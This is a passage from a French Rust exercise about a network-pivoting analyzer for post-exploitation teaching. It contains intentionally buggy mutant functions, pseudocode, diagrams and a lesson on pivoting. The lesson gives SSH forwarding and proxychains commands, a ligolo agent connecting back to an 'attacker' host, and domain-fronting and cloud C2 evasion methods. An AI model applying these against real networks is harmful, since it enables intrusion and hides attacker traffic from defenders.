/* Mutant A (Boundary) : Off-by-one dans le parcours de chemin */
pub fn analyze_pivoting_mutant_a(input: &PivotInput) -> PivotOutput {
    // ...
    for i in 0..path.len() {  // â† ERREUR: devrait Ãªtre path.len() - 1
        let from = &path[i];
        let to = &path[i + 1];  // â† Index out of bounds sur le dernier!
        // ...
    }
    // ...
}
// Pourquoi c'est faux: AccÃ¨s hors limites quand i == path.len() - 1
// Ce qui Ã©tait pensÃ©: "Je dois parcourir tous les Ã©lÃ©ments"

/* Mutant B (Safety) : Ne vÃ©rifie pas l'existence des segments */
pub fn build_network_graph_mutant_b(topology: &NetworkTopology) -> HashMap<String, Vec<String>> {
    let mut graph: HashMap<String, Vec<String>> = HashMap::new();

    // ERREUR: N'initialise pas les segments, seulement les liens
    for link in &topology.links {
        graph.entry(link.from.clone())
            .or_insert_with(Vec::new)
            .push(link.to.clone());
    }

    graph
}
// Pourquoi c'est faux: Les segments sans liens entrants ne sont pas dans le graphe
// Un segment isolÃ© mais destination ne sera pas trouvÃ©

/* Mutant C (Resource) : Boucle infinie sur graphe cyclique */
pub fn find_all_paths_mutant_c(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str
) -> Vec<Vec<String>> {
    let mut all_paths = Vec::new();
    let mut queue: VecDeque<Vec<String>> = VecDeque::new();

    queue.push_back(vec![start.to_string()]);

    while let Some(path) = queue.pop_front() {
        let current = path.last().unwrap();

        if current == end {
            all_paths.push(path);
            continue;
        }

        if let Some(neighbors) = graph.get(current) {
            for neighbor in neighbors {
                // ERREUR: Pas de vÃ©rification des cycles!
                let mut new_path = path.clone();
                new_path.push(neighbor.clone());
                queue.push_back(new_path);
            }
        }
    }

    all_paths
}
// Pourquoi c'est faux: Sur un graphe Aâ†’Bâ†’Câ†’A, boucle infinie
// La queue grandit exponentiellement

/* Mutant D (Logic) : Logique firewall inversÃ©e */
pub fn check_firewall_rules_mutant_d(
    rules: &[FirewallConfig],
    from: &str,
    to: &str,
    port: u16,
    protocol: &str
) -> (bool, Vec<u16>) {
    let config = rules.iter()
        .find(|c| c.from_segment == from && c.to_segment == to);

    if config.is_none() {
        return (true, vec![port]);
    }

    let config = config.unwrap();

    for rule in &config.rules {
        if rule.port.matches(port) {
            // ERREUR: Logique inversÃ©e!
            return (rule.action == "deny", vec![]);  // â† deny retourne true!
        }
    }

    (false, vec![])
}
// Pourquoi c'est faux: "allow" bloque et "deny" autorise
// Tous les chemins autorisÃ©s sont bloquÃ©s et vice-versa

/* Mutant E (Return) : Retourne toujours le mÃªme score de stealth */
pub fn recommend_tunnel_technique_mutant_e(
    host: &CompromisedHost,
    allowed_ports: &[u16],
    from_segment: &str,
    to_segment: &str,
    _target_port: u16,
) -> TunnelRecommendation {
    TunnelRecommendation {
        hop: Hop {
            from: from_segment.to_string(),
            to: to_segment.to_string(),
        },
        technique: "ssh".to_string(),
        command: "ssh user@target".to_string(),
        via_host: Some(host.id.clone()),
        ports_required: allowed_ports.to_vec(),
        stealth_score: 5,  // â† Toujours 5, peu importe la technique!
    }
}
// Pourquoi c'est faux: Le score devrait reflÃ©ter la dÃ©tectabilitÃ©
// DNS tunnel (9) vs SSH (5) vs NetCat (3) ont des risques diffÃ©rents
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **ModÃ©lisation rÃ©seau comme graphe** : Segments = nÅ“uds, liens = arÃªtes
2. **Algorithmes de parcours** : BFS pour chemins, Dijkstra pour optimisation
3. **Logique firewall first-match** : Ordre des rÃ¨gles critique
4. **Techniques de tunneling** : SSH, SOCKS, DNS, HTTP
5. **Pivoting multi-niveaux** : ChaÃ®nage de tunnels
6. **Ã‰vasion et stealth** : Domain fronting, canaux cachÃ©s

### 5.2 LDA â€” Traduction LittÃ©rale

```
FONCTION analyze_pivoting QUI RETOURNE UNE STRUCTURE PivotOutput ET PREND EN PARAMÃˆTRE input QUI EST UNE RÃ‰FÃ‰RENCE VERS UNE STRUCTURE PivotInput
DÃ‰BUT FONCTION
    DÃ‰CLARER warnings COMME VECTEUR DE CHAÃNES VIDE

    AFFECTER CONSTRUIRE_GRAPHE_RÃ‰SEAU(input.network_topology) Ã€ graph
    AFFECTER TROUVER_TOUS_LES_CHEMINS(graph, input.attacker.segment, input.target.segment) Ã€ all_paths

    DÃ‰CLARER pivot_paths COMME VECTEUR VIDE
    DÃ‰CLARER tunnel_recommendations COMME VECTEUR VIDE

    POUR CHAQUE path DANS all_paths AVEC INDEX idx FAIRE
        AFFECTER VRAI Ã€ feasible
        AFFECTER NUL Ã€ blocked_by

        POUR i ALLANT DE 0 Ã€ LONGUEUR(path) MOINS 2 FAIRE
            AFFECTER path[i] Ã€ from
            AFFECTER path[i+1] Ã€ to

            AFFECTER OBTENIR_HÃ”TES_DANS_SEGMENT(input.compromised_hosts, from) Ã€ hosts

            SI i EST SUPÃ‰RIEUR Ã€ 0 ET hosts EST VIDE ALORS
                AFFECTER FAUX Ã€ feasible
                AFFECTER "Pas d'hÃ´te dans segment" Ã€ blocked_by
                SORTIR DE LA BOUCLE
            FIN SI

            AFFECTER VÃ‰RIFIER_RÃˆGLES_FIREWALL(input.firewall_rules, from, to, port, "tcp") Ã€ (allowed, allowed_ports)

            SI NON allowed ET allowed_ports EST VIDE ALORS
                AFFECTER FAUX Ã€ feasible
                AFFECTER "Firewall bloque" Ã€ blocked_by
                SORTIR DE LA BOUCLE
            FIN SI

            SI hosts N'EST PAS VIDE ALORS
                AJOUTER RECOMMANDER_TECHNIQUE_TUNNEL(hosts[0], allowed_ports) Ã€ tunnel_recommendations
            FIN SI
        FIN POUR

        AJOUTER NOUVELLE STRUCTURE PivotPath Ã€ pivot_paths
    FIN POUR

    AFFECTER Ã‰VALUER_OPTIONS_STEALTH(input.stealth_options) Ã€ stealth_options
    AFFECTER GÃ‰NÃ‰RER_PLAN_OPTIMAL(pivot_paths, tunnel_recommendations) Ã€ optimal_plan

    RETOURNER NOUVELLE STRUCTURE PivotOutput
FIN FONCTION
```

### 5.2.2 Logic Flow

```
ALGORITHME : Analyse de Pivoting RÃ©seau
---
1. CONSTRUIRE le graphe rÃ©seau (segments â†’ nÅ“uds, liens â†’ arÃªtes)

2. TROUVER tous les chemins possibles via BFS :
   a. INITIALISER queue avec [start]
   b. TANT QUE queue non vide :
      - EXTRAIRE chemin courant
      - SI dernier nÅ“ud == destination â†’ AJOUTER aux rÃ©sultats
      - SINON pour chaque voisin non visitÃ© â†’ AJOUTER au chemin et queue

3. POUR CHAQUE chemin trouvÃ© :
   a. POUR CHAQUE saut (segment A â†’ segment B) :
      |
      |-- VÃ‰RIFIER prÃ©sence d'hÃ´te compromis dans A (sauf premier saut)
      |     SI absent â†’ Chemin INFAISABLE
      |
      |-- VÃ‰RIFIER rÃ¨gles firewall Aâ†’B
      |     SI deny all â†’ Chemin BLOQUÃ‰
      |     SI allow port spÃ©cifique â†’ NOTER ports autorisÃ©s
      |
      |-- RECOMMANDER technique tunneling appropriÃ©e

   b. MARQUER chemin comme faisable ou non

4. Ã‰VALUER options stealth (domain fronting, cloud C2, DoH)

5. GÃ‰NÃ‰RER plan optimal :
   - SÃ©lectionner chemin faisable le plus court
   - Calculer risque de dÃ©tection moyen
   - Produire commandes sÃ©quentielles

6. RETOURNER rÃ©sultats complets
```

### 5.3 Visualisation ASCII

```
                            NETWORK PIVOTING TOPOLOGY
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                             â”‚
â”‚   ATTACKER                                                    TARGET        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚Internetâ”‚                                                  â”‚Internalâ”‚   â”‚
â”‚   â”‚        â”‚                                                  â”‚ Server â”‚   â”‚
â”‚   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”˜                                                  â””â”€â”€â”€â”€â–²â”€â”€â”€â”˜   â”‚
â”‚        â”‚                                                           â”‚        â”‚
â”‚        â”‚ HTTPS (443)                                    SSH (22)   â”‚        â”‚
â”‚        â”‚                                                           â”‚        â”‚
â”‚        â–¼              PIVOT POINT                                  â”‚        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚        â”‚
â”‚   â”‚Firewall â”‚â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚    DMZ      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚  Internal   â”‚â”€â”€â”€â”€â”€â”˜        â”‚
â”‚   â”‚ (deny   â”‚  443    â”‚             â”‚  22,3306â”‚   Network   â”‚              â”‚
â”‚   â”‚  most)  â”‚  only   â”‚  web01 â˜…    â”‚  allowedâ”‚             â”‚              â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚
â”‚                              â”‚                                              â”‚
â”‚                              â”‚ â˜… = Compromised Host                        â”‚
â”‚                              â”‚                                              â”‚
â”‚                              â–¼                                              â”‚
â”‚                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                   â”‚
â”‚                    â”‚ TUNNEL OPTIONS:   â”‚                                   â”‚
â”‚                    â”‚ â€¢ Reverse SSH     â”‚                                   â”‚
â”‚                    â”‚ â€¢ HTTPS Tunnel    â”‚                                   â”‚
â”‚                    â”‚ â€¢ SOCKS Proxy     â”‚                                   â”‚
â”‚                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                   â”‚
â”‚                                                                             â”‚
â”‚   PIVOT PATH: Internet â”€â”€443â”€â”€â–º DMZ â”€â”€22â”€â”€â–º Internal                       â”‚
â”‚   TECHNIQUE: Reverse SSH over HTTPS + SSH Dynamic Forward                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

```
                          DOMAIN FRONTING STEALTH
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                             â”‚
â”‚   VICTIM NETWORK                     INTERNET                    ATTACKER   â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚   â”‚   Implant    â”‚                                              â”‚   C2   â”‚ â”‚
â”‚   â”‚              â”‚â”€â”€â”                                           â”‚ Server â”‚ â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚                                           â””â”€â”€â”€â”€â–²â”€â”€â”€â”˜ â”‚
â”‚                     â”‚                                                â”‚      â”‚
â”‚                     â”‚ TLS (SNI: cdn.cloudfront.net)                 â”‚      â”‚
â”‚                     â”‚                                                â”‚      â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚      â”‚
â”‚   â”‚   Firewall   â”‚â—„â”€â”˜    â”‚                     â”‚                    â”‚      â”‚
â”‚   â”‚              â”‚â”€â”€â”€â”€â”€â”€â–ºâ”‚   CloudFront CDN    â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚   â”‚ Allows CDN   â”‚       â”‚                     â”‚                           â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚  HTTP Host Header:  â”‚                           â”‚
â”‚                          â”‚  malicious.cf.net   â”‚                           â”‚
â”‚                          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                           â”‚
â”‚                                                                             â”‚
â”‚   Firewall sees: "HTTPS to legitimate CDN" âœ“                               â”‚
â”‚   Reality: Traffic routed to attacker C2 via CDN                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.4 Les piÃ¨ges en dÃ©tail

| PiÃ¨ge | Description | Solution |
|-------|-------------|----------|
| **Cycles dans le graphe** | BFS sans dÃ©tection de cycles â†’ boucle infinie | Maintenir un set de nÅ“uds visitÃ©s |
| **First-match firewall** | Prendre la derniÃ¨re rÃ¨gle au lieu de la premiÃ¨re | `return` dÃ¨s qu'une rÃ¨gle match |
| **Pas d'hÃ´te pivot** | Chemin existe mais pas de point de pivot | VÃ©rifier hÃ´tes compromis dans chaque segment intermÃ©diaire |
| **Bidirectional links** | Oublier d'ajouter l'arÃªte dans les deux sens | Double entrÃ©e dans le graphe |
| **Port mismatch** | Tunnel sur un port, target sur un autre | VÃ©rifier la chaÃ®ne complÃ¨te de ports |

### 5.5 Cours Complet

#### 5.5.1 ThÃ©orie du Pivoting

Le **pivoting** est une technique d'attaque post-exploitation oÃ¹ un systÃ¨me compromis sert de "pont" pour atteindre d'autres rÃ©seaux normalement inaccessibles.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    NIVEAUX DE PIVOTING                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚  Niveau 1: Port Forwarding Simple                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”‚
â”‚  â”‚Attacker â”‚â”€â”€â”€â”€â–ºâ”‚ Pivot   â”‚â”€â”€â”€â”€â–ºâ”‚ Target  â”‚                   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â”‚
â”‚              ssh -L 8080:target:80 pivot                        â”‚
â”‚                                                                 â”‚
â”‚  Niveau 2: Dynamic SOCKS Proxy                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”                      â”‚
â”‚  â”‚Attacker â”‚â”€â”€â”€â”€â–ºâ”‚ Pivot   â”‚â”€â”€â”€â”€â–ºâ”‚ Any  â”‚                      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”˜                      â”‚
â”‚              ssh -D 1080 pivot                                  â”‚
â”‚              proxychains nmap target                            â”‚
â”‚                                                                 â”‚
â”‚  Niveau 3: Multi-hop (Double Pivot)                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚Attacker â”‚â”€â”€â”€â”€â–ºâ”‚ Pivot1  â”‚â”€â”€â”€â”€â–ºâ”‚ Pivot2  â”‚â”€â”€â”€â”€â–ºâ”‚Targetâ”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### 5.5.2 Ligolo-ng : Tunneling Moderne

Ligolo-ng crÃ©e une interface TUN sur l'attaquant, permettant un routage transparent :

```bash
# Sur l'attaquant (proxy)
./ligolo-proxy -selfcert

# Sur la cible (agent)
./ligolo-agent -connect attacker:11601 -ignore-cert

# Commandes proxy
ligolo-ng Â» session
ligolo-ng Â» route_add 10.0.2.0/24
```

**Avantages :**
- Pas de SOCKS configuration
- Support des outils non-proxy aware
- Performance proche du natif

#### 5.5.3 Techniques de C2 Stealth

**Domain Fronting :**
```
1. Client Ã©tablit TLS vers CDN (SNI: legitimate.cloudfront.net)
2. Firewall voit du trafic HTTPS vers CDN âœ“
3. HTTP Host header contient le vrai C2
4. CDN route vers le backend malveillant
```

**Cloud C2 :**
- AWS Lambda functions
- Azure Functions
- Google Cloud Run
- Trafic se mÃ©lange au trafic cloud lÃ©gitime

#### 5.5.4 Algorithmes de Graphe pour le Pivoting

**BFS pour tous les chemins :**
```rust
// ComplexitÃ©: O(V + E) pour un chemin, O(V! / (V-k)!) pour tous
fn find_paths(graph: &Graph, start: Node, end: Node) -> Vec<Path> {
    let mut queue = VecDeque::new();
    let mut results = Vec::new();

    queue.push_back(vec![start]);

    while let Some(path) = queue.pop_front() {
        let current = path.last();

        if current == end {
            results.push(path);
            continue;
        }

        for neighbor in graph.neighbors(current) {
            if !path.contains(neighbor) {  // Ã‰viter cycles
                let mut new_path = path.clone();
                new_path.push(neighbor);
                queue.push_back(new_path);
            }
        }
    }

    results
}
```

### 5.6 Normes avec explications

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ âŒ HORS NORME                                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ let mut visited = vec![];                                       â”‚
â”‚ // ... parcours ...                                             â”‚
â”‚ if visited.contains(&node) { continue; }                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ âœ… CONFORME                                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ let mut visited: HashSet<String> = HashSet::new();              â”‚
â”‚ // ... parcours ...                                             â”‚
â”‚ if visited.contains(&node) { continue; }                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ğŸ“– POURQUOI ?                                                   â”‚
â”‚                                                                 â”‚
â”‚ â€¢ Vec::contains = O(n), HashSet::contains = O(1)                â”‚
â”‚ â€¢ Sur un graphe de 50 nÅ“uds, diffÃ©rence significative           â”‚
â”‚ â€¢ LisibilitÃ© : HashSet exprime l'intention "ensemble unique"    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.7 Simulation avec trace d'exÃ©cution

**EntrÃ©e :** Topologie Aâ†’Bâ†’C, hÃ´te compromis dans B, firewall Bâ†’C allow port 22

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Ã‰tape â”‚ OpÃ©ration                                                  â”‚ Ã‰tat       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   1   â”‚ Construire graphe: Aâ†’B, Bâ†’C, Bâ†’A, Câ†’B (bidirectionnel)    â”‚ Graph OK   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   2   â”‚ BFS depuis A vers C                                        â”‚            â”‚
â”‚       â”‚ Queue: [[A]]                                               â”‚            â”‚
â”‚       â”‚ Pop [A], voisins: [B]                                      â”‚            â”‚
â”‚       â”‚ Queue: [[A,B]]                                             â”‚            â”‚
â”‚       â”‚ Pop [A,B], voisins: [C,A] (A dÃ©jÃ  dans path)              â”‚            â”‚
â”‚       â”‚ Queue: [[A,B,C]]                                           â”‚            â”‚
â”‚       â”‚ Pop [A,B,C], C == target â†’ FOUND                           â”‚ Path found â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   3   â”‚ Analyser chemin [A, B, C]                                  â”‚            â”‚
â”‚       â”‚ Saut Aâ†’B: Pas de firewall, pas besoin d'hÃ´te (1er saut)   â”‚ OK         â”‚
â”‚       â”‚ Saut Bâ†’C: Firewall allow 22, hÃ´te "h1" prÃ©sent dans B     â”‚ OK         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   4   â”‚ Recommander tunnel Bâ†’C via h1                              â”‚            â”‚
â”‚       â”‚ h1 capabilities: ["ssh"]                                   â”‚            â”‚
â”‚       â”‚ Port 22 autorisÃ© â†’ ssh_dynamic                             â”‚ Tunnel OK  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   5   â”‚ RÃ©sultat: Chemin faisable, 2 sauts, risque moyen          â”‚ COMPLETE   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.8 MnÃ©motechniques

#### ğŸ¬ MEME : "Inception â€” RÃªve dans le RÃªve"

```
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚                                          â”‚
                    â”‚   "We need to go DEEPER"                 â”‚
                    â”‚         â€” Dom Cobb                       â”‚
                    â”‚                                          â”‚
                    â”‚   Niveau 1: DMZ (le rÃªve partagÃ©)        â”‚
                    â”‚   Niveau 2: Internal (rÃªve dans rÃªve)    â”‚
                    â”‚   Niveau 3: Database (le Limbo)          â”‚
                    â”‚                                          â”‚
                    â”‚   Chaque KICK = changement de tunnel     â”‚
                    â”‚   Les PROJECTIONS = firewalls/IDS        â”‚
                    â”‚   L'ARCHITECTE = hÃ´te compromis          â”‚
                    â”‚                                          â”‚
